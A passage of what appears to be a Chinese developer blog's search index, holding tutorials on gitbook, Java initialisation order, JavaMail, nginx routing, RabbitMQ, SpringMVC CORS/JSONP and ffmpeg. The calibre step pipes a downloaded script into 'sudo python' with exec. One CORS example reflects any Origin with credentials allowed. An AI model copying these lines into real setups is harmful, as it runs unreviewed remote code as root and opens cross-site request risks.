这里就给了一个标准答案，强烈推荐有兴趣的小伙伴瞅一下 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/05/25/220525-Guava-HashMultimap使用及注意事项/"},{"title":"Centos 安装gitbook","text":"Gibook安装说明 主要记录在centos环境下如何搭建一个gitbook的服务 1. nodejs安装1sudo yum install nodejs 2. gitbook安装12npm install gitbook -gnpm install gitbook-cli -g 上面执行完毕，可能出现一个问题 1npm: symbol SSL_set_cert_cb, version libssl.so.10 not defined in file libssl 解决方法 1yum update openssl 3. calibre安装直接到官网上下载 ； ·https://calibre-ebook.com/download· 1sudo -v &amp;&amp; wget -nv -O- https://download.calibre-ebook.com/linux-installer.py | sudo python -c &quot;import sys; main=lambda:sys.stderr.write(&apos;Download failed\\n&apos;); exec(sys.stdin.read()); main()&quot; 4. 测试1gitbook build . 执行完毕之后，会出现一个 _book 目录， 里面就是生成的静态网页，直接加上去即可 5. 输出pdf如果报错 1ImportError: libGL.so.1: cannot open shared object file: No such file or directory 则安装 1yum install mesa-libGL.x86_64 如果报错 1ImportError: libXrender.so.1: cannot open shared object file: No such file or directory 1yum install libXrender.so.1 -y 参考文档 基于centos6构建私有gitbook平台","link":"/hexblog/2017/12/25/Centos-安装gitbook/"},{"title":"Java中变量的初始化顺序","text":"Java中变量的初始化顺序 在写一个通用的报警模块时，遇到一个有意思的问题，在调用静态方法时，发现静态方法内部对静态变量引用时，居然抛出了npe，仿佛是因为这个静态变量的初始化在静态方法被调用时，还没有触发，从而导致这个问题，因此今天专门来学习下静态成员的初始化顺序，以及上面这个问题导致的原因 I. 初始化顺序类的初始化顺序 静态变量, 静态代码快 -》 实例变量（属性，实例代码块，构造方法） 继承关系初始化顺序 父类静态成员，静态代码块 -》 子类静态成员，静态代码块 -》 父类实例变量（属性，实例代码块，构造方法）-》子类实例变量（属性，实例代码块，构造方法） II. 静态变量初始化顺序类初始化时，会优先初始化静态成员，那么一个类中有多个静态成员时，如何处理的？ 下面是一个使用静态成员，静态代码块，静态方法的测试类，那么下面的输出应该是怎样的呢？ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class StaticTest { static class A { public A(int i) { System.out.println(\"a init! \" + i); } } static class B { public B(int i) { System.out.println(\"b init! \" + i); } } private static A a1 = new A(1); private static B b1; private static int num; private static B b2 = new B(2); private static A a2 = genA(2); static { b1 = new B(1); } private static A genA(int i) { System.out.println(\"gen A: \" + i); return new A(i); } private static B genB(int i) { System.out.println(\"gen B: \" + i); return new B(i); } public static void doSome() { System.out.println(\"static function doSome called! a3!=null : \" + (a3 != null) + \" | num &gt; 0 : \" + num); } private static A a3; private static B b3; static { System.out.println(\"num : \" + num); num = 10; a3 = genA(3); b3 = genB(3); } public static void main(String[] args) { doSome(); }} 输出如下 1234567891011a init! 1b init! 2gen A: 2a init! 2b init! 1num : 0gen A: 3a init! 3gen B: 3b init! 3static function doSome called! a3!=null : true | num &gt; 0 : 10 从实际的输出结果来看： 初始化的顺序比较清晰了，压根就是根据初始化代码的先后顺序来的， 且在调用静态方法时，静态方法内部的静态成员已经被初始化 那么问题来了，如果在某个静态成员初始化的时候抛出了异常，会怎样？ 那么稍稍改一下上面的代码，加一个主动抛异常的case 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465public class StaticTest { static class A { public A(int i) { System.out.println(\"a init! \" + i); } } static class B { public B(int i) { System.out.println(\"b init! \" + i); } } private static A a1 = new A(1); private static B b1; private static int num; private static B b2 = new B(2); private static A a2 = genA(2); static { b1 = new B(1); } private static A genA(int i) { System.out.println(\"gen A: \" + i); return new A(i); } private static B genB(int i) { System.out.println(\"gen B: \" + i); return new B(i); } private static A aError = genError(); private static A genError() { System.out.println(\"gen error!\"); throw new RuntimeException();// return new A(10); } public static void doSome() { System.out.println(\"static function doSome called! a3!=null : \" + (a3 != null) + \" | num &gt; 0 : \" + num); } private static A a3; private static B b3; static { System.out.println(\"num : \" + num); num = 10; a3 = genA(3); b3 = genB(3); } public static void main(String[] args) { doSome(); }} 此时输出： 12345678a init! 1b init! 2gen A: 2a init! 2b init! 1gen error!Exception in thread \"main\" java.lang.ExceptionInInitializerErrorCaused by: java.lang.RuntimeException 也就是说，初始化异常之后的代码将不会在继续执行 那么第二个问题来了，前面说到哪个问题是什么情况 最开始说到，在调用类的静态方法时，发现本该被初始化的静态成员，依然是null，从上面的分析来说，唯一的可能就是在成员变量初始化的过程中，出现了异常 那么，就有另一个问题了，初始化就报错了，这个类的静态方法还能被调用执行么（加入这个静态方法不依赖内部的静态成员）？ 将前面的 genA()方法的private去掉，改成默认的访问范围，然后下面给出一个演示： 通过这个演示，也挺有意思的，第一次访问，会抛出一个初始化异常；但是再调用一次，结果发现居然正常执行了；但是调用public方法时，每次都是抛异常 导致这个问题的原因，还有待考究，但是前面这个问题的答案，估摸着和下面差不多了（但是不敢确定，有待大神指点） 理论上类初始化失败，应该就不允许被调用了 但是某些情况下，可以绕过这个限制 III. 成员变量的初始化测试case也比较简单，把前面的代码中的static去掉即可， 输出 1234567891011a init! 1b init! 2gen A: 2a init! 2b init! 1num : 0gen A: 3a init! 3gen B: 3b init! 3static function doSome called! a3!=null : true | num &gt; 0 : 10 依然是根据初始化代码的先后顺序进行的 当然如果出现异常的情况，和前面的结果类似，不再赘述 IV. 小结1. 初始化顺序类的初始化顺序 静态变量, 静态代码快 -》 实例变量（属性，实例代码块，构造方法） 继承关系初始化顺序 父类静态成员，静态代码块 -》 子类静态成员，静态代码块 -》 父类实例变量（属性，实例代码块，构造方法）-》子类实例变量（属性，实例代码块，构造方法） 相同等级的初始化的先后顺序，是直接依赖代码中初始化的先后顺序 2. 初始化异常时理论上，类初始化中抛出了异常，那么这个类将无法被classLoader正确的加载，因此也无法有效的使用这个类 但是不排除某些情况下，依然强行的使用了这个类（如上面gif图中的演示），这个原理还不太清晰，也有可能是idea的debug功能有什么黑科技？ 注意 因此，请格外注意，在初始化代码中，请确保不会有抛出异常，如果无法把控，不妨新建一个init()方法来实现初始化各种状态，然后在代码中主动调用好了 V. 其他声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见解不全，如有问题，欢迎批评指正 扫描关注，java分享","link":"/hexblog/2018/02/07/Java中变量的初始化顺序/"},{"title":"Java实现邮件发送","text":"Java实现邮件发送在日常工作中，通过邮件或短信做报警或者信息推送的场景还是挺多的，而java中，常用的就是JavaMail来做这个事情了，到网上搜索了一把，发现apache有个commons email 的开源包，现在借助它来尝鲜一把 简单使用添加pom依赖: 123456&lt;!--email 客户端--&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-email&lt;/artifactId&gt; &lt;version&gt;1.4&lt;/version&gt;&lt;/dependency&gt; 查看使用帮助: http://commons.apache.org/proper/commons-email/userguide.html 1. 简单使用case1234567891011121314151617181920@Testpublic void testEmailSend() { try { Email email = new SimpleEmail(); email.setHostName(\"smtp.163.com\"); email.setSmtpPort(25); email.setAuthenticator(new DefaultAuthenticator(\"userName\", \"accessToken\")); email.setSSLOnConnect(true); email.setFrom(\"xhhuiblog@163.com\"); email.setCharset(\"utf-8\"); email.addTo(\"bangzewu@126.com\"); email.setSubject(\"邮件标题\"); email.setMsg(\"邮件内容\"); String ans = email.send(); System.out.println(ans); } catch (Exception e) { e.printStackTrace(); }} 从实际的使用来看，还是比较简单的，设置一些必要的参数（host，端口，认证信息，fromEmail, toEmail, title, content） 额外需要注意的一点是，为了中文正常显示，请指定charset 2. html使用姿势更加常见的邮件发送是带有格式的，且有可能有附件，所以我们通常用的更多的是下面的方式 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071private String template = \"&lt;html&gt;&lt;meta charset=utf-8&gt;\\n\" + \"\\n\" + \"&lt;style&gt;\\n\" + \"div.card {\\n\" + \" background-color:white; \\n\" + \" box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);\\n\" + \" text-align: center;\\n\" + \"}\\n\" + \"\\n\" + \"div.header {\\n\" + \" background-color: #4CAF50;\\n\" + \" box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);\\n\" + \" color: white;\\n\" + \" padding: 10px;\\n\" + \" font-size: 40px;\\n\" + \"}\\n\" + \"\\n\" + \"div.container {\\n\" + \" padding: 10px;\\n\" + \"}\\n\" + \"&lt;/style&gt;\\n\" + \"\\n\" + \"&lt;div class=\\\"card\\\"&gt;\\n\" + \" &lt;div class=\\\"header\\\"&gt;\\n\" + \" &lt;h1&gt;星期一&lt;/h1&gt;\\n\" + \" &lt;/div&gt;\\n\" + \"\\n\" + \" &lt;div class=\\\"container\\\"&gt;\\n\" + \" &lt;p&gt;2016.04.10&lt;/p&gt;\\n\" + \" &lt;/div&gt;\\n\" + \"&lt;/div&gt;\\n\" + \"&lt;/html&gt;\";@Testpublic void testHtmlEmailSend() { try { // Create the attachment EmailAttachment attachment = new EmailAttachment(); attachment.setURL(new URL(\"http://s11.mogucdn.com/mlcdn/c45406/180410_256l2egkgj3lfdkjkbf41b1i09l3f_1280x1280.jpg\")); attachment.setDisposition(EmailAttachment.ATTACHMENT); attachment.setDescription(\"公众号\"); attachment.setName(\"logo.jpg\"); HtmlEmail email = new HtmlEmail(); email.setCharset(\"UTF-8\"); email.setHostName(\"smtp.163.com\"); email.setSmtpPort(25); email.setAuthenticator(new DefaultAuthenticator(\"username\", \"token\")); email.setSSLOnConnect(true); email.setFrom(\"xhhuiblog@163.com\"); email.setSubject(\"TestMail\"); // 添加附件 email.attach(attachment); // set the html message email.setHtmlMsg(template); // set the alternative message email.setTextMsg(\"Your email client does not support HTML messages\"); email.addTo(\"bangzewu@126.com\"); String ans = email.send(); System.out.println(ans); } catch (Exception e) { e.printStackTrace(); }} 邮件结果如下: II. 其他个人博客： 一灰灰Blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/04/10/Java实现邮件发送/"},{"title":"Chrome插件之DomToImage实现","text":"I. 说明有些时候，看到一些网页的信息时，想分享给小伙伴，一般直接用截图工具来做，但是当分享的内容比较长时，截图就比较蛋疼了，所以想着做了这么个插件 可以将网页中任意一个dom结构，渲染为图片 1. 实现 主要借助开源包: dom-to-image来实现 基本实现原理： 在网页中插入一段html代码，然后绑定上点击事件，核心逻辑如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647$(\"body\").append('&lt;div id=\"rendFloatDom\" class=\"NYwishes\"&gt;' + '&lt;div id=\"expandInputBtn\" class=\"send\"&gt;&lt;div class=\"send-btn\" style=\"float:right\"&gt;&lt;a onclick=\"document.getElementById(\\'expandInputBtn\\').style.display=\\'none\\';document.getElementById(\\'showRenderImgDiv\\').style.display=\\'block\\';\"&gt;展开&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;' + '&lt;div class=\"send\" id=\"showRenderImgDiv\" style=\"display:none\"&gt;' + '&lt;div class=\"input\"&gt;&lt;input id=\"choose-id\" name=\"content\" type=\"text\" placeholder=\"cid: | id: + 标签\" &gt;&lt;/div&gt;' + '&lt;div class=\"send-btn\" &gt;&lt;a id=\"RenderImgBtn\"&gt;渲染&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;' + '');function doRender() { var chooseVal = document.getElementById('choose-id').value; var node; if(chooseVal.startsWith('cid:')) { chooseVal = chooseVal.substring(4); node = document.getElementsByClassName(chooseVal)[0]; } else { if(chooseVal.startsWith(\"id:\")) { chooseVal = chooseVal.substring(3); } if (\"\" == chooseVal) { return; } node = document.getElementById(chooseVal); } if(node == null || typeof(node) == undefined) { alert(\"没有选中的dom结构\"); return; } domtoimage.toPng(node) .then(function (dataUrl) { var url = dataUrl; window.open().document.write('&lt;html&gt;&lt;head&gt;&lt;title&gt;渲染图&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=\\'text-align:center\\'&gt;&lt;a download=\"out.png\" href=\"' + url + '\"&gt;&lt;img src=\"' + url + '\" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;'); }) .catch(function (error) {});}$(\"#choose-id\").keydown(function(e) { if (e.keyCode == 13) { doRender(); }});$('#RenderImgBtn').click(function() { doRender();}); 2. 使用演示 II. 其他个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/03/12/Chrome插件之DomToImage实现/"},{"title":"Mac连WIFI频繁掉线问题记录","text":"mac 连家里的wifi，基本上每各个10分钟左右，就掉线一次，必须断掉wifi重新连才重新有网，无比蛋疼 解决方案：请NVARM 开机前按住： cmd + option + p + r 听到咔咔声音之后，松开，然后重启电脑，over 扫描关注","link":"/hexblog/2018/05/12/Mac连WIFI频繁掉线问题记录/"},{"title":"Nginx 路由转发配置笔记","text":"Nginx 路由转发配置笔记 由于预算有限，只有一台服务器，想要玩的东西不少，所以这个台服务器上会提供多重服务，因此涉及到的nginx转发就必有重要了 由nginx做请求代理，提供多种服务 php搭建的网站 hexo创建的博客系统 spring-boot &amp; tomcat搭建的后台 静态网页 本片配置笔记中，主要集中以下几个内容 location的匹配规则是怎样的 如何实现路由转发（反向代理） 如何修改请求的路径（如请求的是 a/index.html 改为 a/public/index.html） I. location匹配规则1. 语法123location [=|~|~*|^~|@] /uri/ { ...} 2. 说明从上面的语法出发，可以了解到location可以区分为三个部分，接下来一个一个的研究一下 a. PartOne: [=|~|~*|^~|@] = : 表示精确匹配后面的url ~ : 表示正则匹配，但是区分大小写 ~* : 正则匹配，不区分大小写 ^~ : 表示普通字符匹配，如果该选项匹配，只匹配该选项，不匹配别的选项，一般用来匹配目录 @ : “@” 定义一个命名的 location，使用在内部定向时，例如 error_page 上面定义了几个不同的符号，表示不同的匹配规则，那么先后顺序呢？ =前缀的指令严格匹配这个查询。如果找到，停止搜索。 所有剩下的常规字符串，最长的匹配。如果这个匹配使用^〜前缀，搜索停止。 正则表达式，在配置文件中定义的顺序。 如果第3条规则产生匹配的话，结果被使用。否则，使用第2条规则的结果。 直接看这个可能不太好理解，写几个case实际测试一下 测试case1: 123456789101112131415location = /world { return 600;}location = /hello { return 600;}location ~ /hellowo { return 602;}location ^~ /hello { return 601;} 12345678- 请求 localhost/world 返回600- 请求 localhost/world2 localhost/test/world 返回其他- 请求 localhost/hello 返回600- 请求 localhost/hello/123 返回601- 请求 localhost/hellow 返回601- 请求 localhost/hellowo 返回601- 请求 localhost/test/hellowo 返回602- 请求 localhost/test/hello 返回其他 因此可以知道 = 是精确完整匹配, 且优秀最高 正则匹配时，如果 ~ 和 ^~ 同时匹配规则，则 ^~ 优先 ^~ 这个不会匹配请求url中后面的路径, 如上面的 /test/hello 没有匹配上 ^~ 不支持正则，和=相比，范围更广， hellowo 是可以被^~匹配，但是 = 不会匹配 ~ 路径中只要包含就可以匹配，如上面的 /test/hellowo 返回了602 测试case2: 1234567location ~ /hello { return 602;}location ~ /helloworld { return 601;} 12- 请求 localhost/world/helloworld 返回 602- 请求 localhost/helloworld 返回 602 调整一下上面的顺序之后 1234567location ~ /helloworld { return 601;}location ~ /hello { return 602;} 123- 请求 localhost/helloworld 返回601- 请求 localhost/world/helloworld 返回601- 请求 localhost/helloWorld 返回602 所以同时正则匹配时 放在前面的优先匹配 注意如果不区分大小写时，使用~* 尽量将精确匹配的放在前面 测试case3: 1234567location ^~ /hello/ { return 601;}location /hello/world { return 602;} 这种场景中，存在一个没有符号的路由规则，那么实际的测试是怎样呢？ 1234- http://localhost/hello/wor 返回601- http://localhost/hello/world 返回602- http://localhost/hello/world23 返回602- http://localhost/hello/world/123 返回602 从上面case可以看出 没有符号时，全匹配是优先于^~的 b. PartTwo: [uri]这里主要填的就是需要匹配的path路径，根据前面的符号，这里可以填写精确的path路径，也可以填正则表达式，下面则主要针对正则进行说明 123456789101112. ： 匹配除换行符以外的任意字符? ： 重复0次或1次+ ： 重复1次或更多次* ： 重复0次或更多次\\d ：匹配数字^ ： 匹配字符串的开始$ ： 匹配字符串的介绍{n} ： 重复n次{n,} ： 重复n次或更多次[c] ： 匹配单个字符c[a-z] ： 匹配a-z小写字母的任意一个小括号()之间匹配的内容，可以在后面通过$1来引用，$2表示的是前面第二个()里的内容。正则里面容易让人困惑的是\\转义特殊字符。 c. PartThree: {}匹配完毕之后内部定义一些列的处理动作，这个涉及到的点比较多，这里不详细展开，后面有空单独捞出 II. 路由转发 请求path匹配只是第一步，匹配完了之后，如何将请求转发给其他的web服务呢？ 0. 反向代理通常可见的一种使用姿势就是使用nginx，代理请求，转发到内部的tomact服务上 主要是通过 proxy_pass 这个来实现 123location ^~ /webs { proxy_pass http://127.0.0.1:8080/webs;} 将所有以 webs开头的请求，转发给8080端口的tomcat服务上 上面是直接写死转发到一个ip上，如果是多个机器提供服务呢？可以这么玩 12345678910## 下面放在http的括号内，作为第一层upstream test.online { server 120.11.11.11:8080 weight=1; server 120.11.11.12:8080 weight=1;}location ^~ /webs { proxy_pass http://test.online; proxy_redirect default;} 1. Rewrite命令rewrite功能就是，使用nginx提供的全局变量或自己设置的变量，结合正则表达式和标志位实现url重写以及重定向。 rewrite只能放在server{},location{},if{}中， 并且只能对域名后边的除去传递的参数外的字符串起作用, 如 http://zbang.online/a/we/index.php?id=1&amp;u=str 只对/a/we/index.php重写。 语法rewrite regex replacement [flag]; 一个case，通过rewrite实现对url的重写，将下面的 12345678location ^~ /hexo { root &apos;/Users/yihui/GitHub/&apos;;}location ~ /hello { rewrite ^(/hello).*$ /hexo/public/index.html last; return 603;} 将hello开头的，全部转发到/hexo/public/index.html III. 小结1. demo将所有以blog开头的请求，全部转发到某个地方 123location ^~ /blog { root &apos;/var/www/html/blog&apos;;} 2. 路径匹配规则 = : 表示精确匹配后面的url ~ : 表示正则匹配，但是区分大小写 ~* : 正则匹配，不区分大小写 ^~ : 表示普通字符匹配，如果该选项匹配，只匹配该选项，不匹配别的选项，一般用来匹配目录 @ : “@” 定义一个命名的 location，使用在内部定向时，例如 error_page 匹配顺序如下： =前缀的指令严格匹配这个查询。如果找到，停止搜索。 所有剩下的常规字符串，最长的匹配。如果这个匹配使用^〜前缀，搜索停止。 正则表达式，在配置文件中定义的顺序。 如果第3条规则产生匹配的话，结果被使用。否则，使用第2条规则的结果。 3. 路由转发 通过 proxy_pass 可以实现反向代理 通过 rewrite 可以实现路由转发 IV. 参考 location匹配顺序 nginx 常见正则匹配符号表示 V. 其他声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如有问题，请不吝指正，感激 扫描关注，不定时分享各种java学习笔记","link":"/hexblog/2017/12/27/Nginx-路由转发配置笔记/"},{"title":"RabbitMq基础教程之安装与测试","text":"RabbitMq基础教程之安装与测试 Installing on Mac I. 安装123456789brew install rabbitmq## 进入安装目录cd /usr/local/Cellar/rabbitmq/3.7.5# 启动brew services start rabbitmq# 当前窗口启动rabbitmq-server 启动控制台之前需要先开启插件 1./rabbitmq-plugins enable rabbitmq_management 进入控制台: http://localhost:15672/ 用户名和密码：guest,guest II. 配置与测试1. 添加账号首先是得启动mq 123456## 添加账号./rabbitmqctl add_user admin admin## 添加访问权限./rabbitmqctl set_permissions -p \"/\" admin \".*\" \".*\" \".*\"## 设置超级权限./rabbitmqctl set_user_tags admin administrator 2. 编码实测pom引入依赖 1234&lt;dependency&gt; &lt;groupId&gt;com.rabbitmq&lt;/groupId&gt; &lt;artifactId&gt;amqp-client&lt;/artifactId&gt;&lt;/dependency&gt; 开始写代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283public class RabbitMqTest { //消息队列名称 private final static String QUEUE_NAME = \"hello\"; @Test public void send() throws java.io.IOException, TimeoutException { //创建连接工程 ConnectionFactory factory = new ConnectionFactory(); factory.setHost(\"127.0.0.1\"); factory.setPort(5672); factory.setUsername(\"admin\"); factory.setPassword(\"admin\"); //创建连接 Connection connection = factory.newConnection(); //创建消息通道 Channel channel = connection.createChannel(); //生成一个消息队列 channel.queueDeclare(QUEUE_NAME, true, false, false, null); for (int i = 0; i &lt; 10; i++) { String message = \"Hello World RabbitMQ count: \" + i; //发布消息，第一个参数表示路由（Exchange名称），未\"\"则表示使用默认消息路由 channel.basicPublish(\"\", QUEUE_NAME, null, message.getBytes()); System.out.println(\" [x] Sent '\" + message + \"'\"); } //关闭消息通道和连接 channel.close(); connection.close(); } @Test public void consumer() throws java.io.IOException, java.lang.InterruptedException, TimeoutException { //创建连接工厂 ConnectionFactory factory = new ConnectionFactory(); factory.setHost(\"127.0.0.1\"); factory.setPort(5672); factory.setUsername(\"admin\"); factory.setPassword(\"admin\"); //创建连接 Connection connection = factory.newConnection(); //创建消息信道 Channel channel = connection.createChannel(); //消息队列 channel.queueDeclare(QUEUE_NAME, true, false, false, null); System.out.println(\"[*] Waiting for message. To exist press CTRL+C\"); AtomicInteger count = new AtomicInteger(0); //消费者用于获取消息信道绑定的消息队列中的信息 Consumer consumer = new DefaultConsumer(channel) { @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { String message = new String(body, \"UTF-8\"); try { System.out.println(\" [x] Received '\" + message); } finally { System.out.println(\" [x] Done\"); channel.basicAck(envelope.getDeliveryTag(), false); } } }; channel.basicConsume(QUEUE_NAME, false, consumer); Thread.sleep(1000 * 60); }} 需要注意的一点是： 生产消息: channel.queueDeclare(QUEUE_NAME, true, false, false, null); 消费消息: channel.queueDeclare(QUEUE_NAME, true, false, false, null); 生产和消费都声明channel，要求两者的配置参数一致，否则无法消费数据 3. 输出说明首先执行塞入数据，执行完毕之后，可以到控制台进行查看: 可以看到多出了一个Queue，对列名为hello，总共有10条数据 接下来就是消费数据了，执行consumer方法，输出日志 123456789101112131415161718192021[*] Waiting for message. To exist press CTRL+C [x] Received 'Hello World RabbitMQ count: 0 [x] Done [x] Received 'Hello World RabbitMQ count: 1 [x] Done [x] Received 'Hello World RabbitMQ count: 2 [x] Done [x] Received 'Hello World RabbitMQ count: 3 [x] Done [x] Received 'Hello World RabbitMQ count: 4 [x] Done [x] Received 'Hello World RabbitMQ count: 5 [x] Done [x] Received 'Hello World RabbitMQ count: 6 [x] Done [x] Received 'Hello World RabbitMQ count: 7 [x] Done [x] Received 'Hello World RabbitMQ count: 8 [x] Done [x] Received 'Hello World RabbitMQ count: 9 [x] Done 回头去查看queue，发现总得数据量为0了 4. ACK问题对于ack的问题，如果在消费数据的时候，出现异常，而我不希望数据丢失，这个时候就需要考虑手动ack的机制来保证了 首先需要设置手动ack 12// 设置autoAck为falsechannel.basicConsume(QUEUE_NAME, false, consumer); 其次在消费数据完毕之后，主动ack/nack 12345if (success) { channel.basicAck(envelope.getDeliveryTag(), false);} else { channel.basicNack(envelope.getDeliveryTag(), false, false);} III. 其他一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/05/24/RabbitMq基础教程之安装与测试/"},{"title":"SpringMVC支持跨域的几种姿势","text":"SpringMVC支持跨域的几种姿势 跨域好像是一个前端的问题，通常是a域名下向b域名的服务发起请求，然后处于浏览器的安全原则，被拦截了，而这种场景，在实际的项目中并不少见，那么作为后端可以怎么去支持跨域的case呢？ 后端需要支持跨域，一个是支持jsonp请求；还有一个就是设置responseHeader中crossOrigin等相关参数 I. Jsonp的支持jsonp的请求表现方式就是url里面会多一个参数 callback，一般如下 1callback=jQuery21105810685605043302_1516257942328 jsonp的返回与一般调用方式的返回也会有点区别，会在外面包装一层，如 1jQuery21105810685605043302_1516257942328(...); springmvc中，jsonp的支持却是比较简单了，不需要对现有的接口进行任何处理，只需要像下面这么玩即可 123456@ControllerAdvicepublic class JsonpAdvice extends AbstractJsonpResponseBodyAdvice { public JsonpAdvice() { super(\"callback\"); }} 分析说明首先是利用了注解 @ControllerAdvice ， 这个注解在后面说到的统一异常处理时，也会用到，从命名也可以看出，就是为Controller添加一个切面，简单来讲，就是在直接返回数据前，对返回的结果包装一把；从实现也可以看出，主要的逻辑就在 AbstractJsonpResponseBodyAdvice 里面，所以有必要看一下这个东西是怎么支持的了 核心的代码逻辑就是 123456789101112131415161718192021222324@Overrideprotected void beforeBodyWriteInternal(MappingJacksonValue bodyContainer, MediaType contentType, MethodParameter returnType, ServerHttpRequest request, ServerHttpResponse response) { HttpServletRequest servletRequest = ((ServletServerHttpRequest) request).getServletRequest(); for (String name : this.jsonpQueryParamNames) { String value = servletRequest.getParameter(name); if (value != null) { if (!isValidJsonpQueryParam(value)) { if (logger.isDebugEnabled()) { logger.debug(\"Ignoring invalid jsonp parameter value: \" + value); } continue; } // 下面三行是主要的逻辑 MediaType contentTypeToUse = getContentType(contentType, request, response); response.getHeaders().setContentType(contentTypeToUse); bodyContainer.setJsonpFunction(value); break; } }} 直接看可能看不太明白究竟做了什么，写了个测试，debug下相关的参数如下 即，修改返回的 content-type 为： application/javascript 返回的Container里面设置了jsonpFunction，为请求参数的value，至于是在什么时候封装的返回结果呢？这个有待后续补全 II. 支持cors跨域 Cross-Origin Resource Sharing（CORS）跨来源资源共享是一份浏览器技术的规范，提供了 Web 服务从不同域传来沙盒脚本的方法，以避开浏览器的同源策略，是 JSONP 模式的现代版。与 JSONP 不同，CORS 除了 GET 要求方法以外也支持其他的 HTTP 要求 1. 背景CORS背后的基本思想是使用自定义的HTTP头部允许浏览器和服务器相互了解对方，从而决定请求或响应成功与否 所以问题就来了，安全如何保证？ 一般而言，为了避免夸站点攻击(csrf)，常见的手段无非： 身份校验（比如要求用户登录） token验证 ip白名单 来源referer校验 频率限制 2. 实现方式要支持csrf，也比较简单了，无非就是设置下responseHeader了, 一般需要设置以下几项 Access-Control-Allow-Origin: *; // 允许的来源 Access-Control-Allow-Methods: GET, POST, PUT, DELETE Access-Control-Allow-Credentials: true Access-Control-Allow-Headers: Content-Type Access-Control-Max-Age: 1800 //30 min 所以实现起来的方式就比较多了，一个是新增一个filter，主动设置下返回头，当然spring mvc提供了更友好的方式了 常见的几种手段如下: a. xml配置方式12345&lt;mvc:cors&gt; &lt;mvc:mapping path=\"/ajax/*\" allowed-origins=\"*\" max-age=\"3600\" /&gt;&lt;/mvc:cors&gt; b. 注解方式在controller方法上，添加下面这个注解即可 12345@CrossOrigin(origins = \"*\")@RequestMapping(value = {\"xx\"}, method = {RequestMethod.GET, RequestMethod.POST, RequestMethod.OPTIONS})public ResponseWrapper&lt;WxBaseResponse&gt; create(HttpServletRequest httpServletRequest) {} c. 直接修改返回的responseHeader123response.setHeader(\"Access-Control-Allow-Origin\", request.getHeader(\"origin\"));response.setHeader(\"Access-Control-Allow-Methods\", \"*\");response.setHeader(\"Access-Control-Allow-Credentials\", \"true\"); III. 小结上面介绍了两种方式，支持起来都比较简单 jsonp: 通过ControllerAdvice拦截Controller，然后继承AbstractJsonpResponseBodyAdvice即可 cors: 通过xml配置或者直接使用 @CrossOrigin注解 IV. 其他声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见解不全，如有问题，欢迎批评指正 扫描关注，java分享","link":"/hexblog/2018/01/19/SpringMVC支持跨域的几种姿势/"},{"title":"ffmpeg安装","text":"I. 音频转码服务支持 机器扩容时，需要手动安装ffmpeg，以支持音频转码 安装过程如下出于解压方便，将 .tar.xz 格式的压缩包转为 .tar.gz， 传到ftp待用 1234567891011121314151617181920212223242526272829## download ffmpge cmdwget https://johnvansickle.com/ffmpeg/releases/ffmpeg-release-64bit-static.tar.xz## exact packagexz -d ffmpeg-release-64bit-static.tar.xztar -xvf ffmpeg-release-64bit-static.tarmv ffmpeg-release-64bit-static ffmpegtar -zcvf ffmpeg.tar.gz ffmpeg## 将安装包上传到ftpftp ftp.mogujie.orgput ffmpeg.tar.gz## 登录到新的机器， 安装ftpsudo yum install ftp## 下载安装包ftp ftp.mogujie.orgget ffmpeg.tar.gz## 进入mapp目录cp ffmpeg.tar.gz /home/yihui## 解压tar -zxvf ffmpeg.tar.gz II. 其他个人博客： 一灰灰Blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2017/08/11/ffmpeg安装/"},{"title":"SpringMVC统一异常处理","text":"统一异常拦截处理方式 项目中不可避免会出现一些异常情况，而一个web项目，若不拦截异常，糟糕的情况下可能直接将堆栈抛给前端，从而导致各种鬼畜的问题 I. 借助@ControllerAdvice拦截异常给一个简单的demo，便可以很容易的了解这种手段如何处理了 1234567891011121314151617181920@ControllerAdvice@Slf4j@ResponseBodypublic class ActionExceptionHandler { @ExceptionHandler(value = Exception.class) public String defaultHandler(HttpServletRequest request, Exception e) { 